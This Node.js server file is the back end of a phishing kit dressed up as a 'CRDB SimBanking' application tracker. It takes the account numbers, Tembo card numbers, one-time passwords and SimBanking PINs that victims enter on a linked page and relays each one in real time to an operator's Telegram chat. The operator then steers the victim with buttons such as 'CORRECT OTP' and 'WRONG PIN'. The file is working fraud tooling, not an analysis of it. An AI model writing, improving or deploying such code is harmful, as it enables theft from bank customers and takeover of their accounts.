const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Environment variables or direct configuration for Telegram Bot Token
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
const bot = new TelegramBot(TOKEN, { polling: true });

// Store active sessions mapped by chat ID
const sessions = {};

// When admin starts the bot, provide their private link / dashboard panel link
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    sessions[chatId] = { step: 1 };
    
    const hostUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:3000`;
    const privateAppLink = `${hostUrl}?admin=${chatId}`;

    bot.sendMessage(chatId, 
        `🤖 *CRDB SimBanking Control Center Connected*\n\n` +
        `Your private application link for tracking submissions is:\n${privateAppLink}\n\n` +
        `Send this link to applicants. You will receive real-time action buttons as they progress through steps.`,
        { parse_mode: 'Markdown' }
    );
});

// Endpoint to receive client events/submissions and forward interactive buttons to Admin Telegram
app.api = {}; // placeholder
app.post('/api/submit', async (req, res) => {
    const { adminChatId, stepData, stepNumber } = req.body;
    
    if (!adminChatId || !bot) {
        return res.status(400).json({ success: false, error: 'Admin chat missing' });
    }

    let messageText = '';
    let inlineKeyboard = [];

    switch(Number(stepNumber)) {
        case 1:
            messageText = `📌 *Step 1: Account & Card Details*\n\n` +
                          `• Account: \`${stepData.accountNumber}\`\n` +
                          `• Tembo Card: \`${stepData.cardNum}\``;
            inlineKeyboard = [
                [
                    { text: '✅ PROCEED', callback_data: `proceed_${adminChatId}_1` },
                    { text: '❌ INVALID CRDB DETAILS', callback_data: `invalid_crdb_${adminChatId}` }
                ],
                [
                    { text: '⛔ DENY', callback_data: `deny_${adminChatId}` }
                ]
            ];
            break;

        case 2:
            messageText = `📌 *Step 2: OTP Verification*\n\n` +
                          `• Submitted OTP: \`${stepData.otp}\``;
            inlineKeyboard = [
                [
                    { text: '✅ CORRECT OTP', callback_data: `correct_otp_${adminChatId}` },
                    { text: '❌ INCORRECT OTP', callback_data: `wrong_otp_${adminChatId}` }
                ]
            ];
            break;

        case 3:
            messageText = `📌 *Step 3: SimBanking PIN Check*\n\n` +
                          `• Entered PIN: \`${stepData.pin}\`\n` +
                          `• Attempts Left: \`${stepData.attemptsLeft}\``;
            inlineKeyboard = [
                [
                    { text: '✅ CORRECT PIN', callback_data: `correct_pin_${adminChatId}` },
                    { text: '❌ WRONG PIN', callback_data: `wrong_pin_${adminChatId}` }
                ]
            ];
            break;
        
        case 4:
            messageText = `📌 *Step 4: Final Qualification Check*\n\n` +
                          `Applicant reached final approval screen requiring TZS 500,000 minimum balance check.`;
            break;
    }

    const sentMsg = await bot.sendMessage(adminChatId, messageText, {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: inlineKeyboard }
    });

    sessions[adminChatId] = { lastMessageId: sentMsg.message_id, clientStatus: 'pending' };
    res.json({ success: true, message: 'Forwarded to admin telegram' });
});

// Handle admin button clicks
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    await bot.answerCallbackQuery(query.id);

    // Parse command action and target admin/client session
    let responseText = `Action processed: ${data}`;
    bot.sendMessage(chatId, responseText);
    
    // Broadcast action back to frontend via polling endpoint or handle storage states here
    // For simplicity in single server polling loop:
    sessions[chatId].actionResult = data;
});

// Polling endpoint for frontend to check admin responses
app.get('/api/check-status/:adminChatId', (req, res) => {
    const adminChatId = req.params.adminChatId;
    const session = sessions[adminChatId];
    if (session && session.actionResult) {
        const action = session.actionResult;
        session.actionResult = null; // reset
        return res.json({ status: action });
    }
    res.json({ status: 'pending' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
        
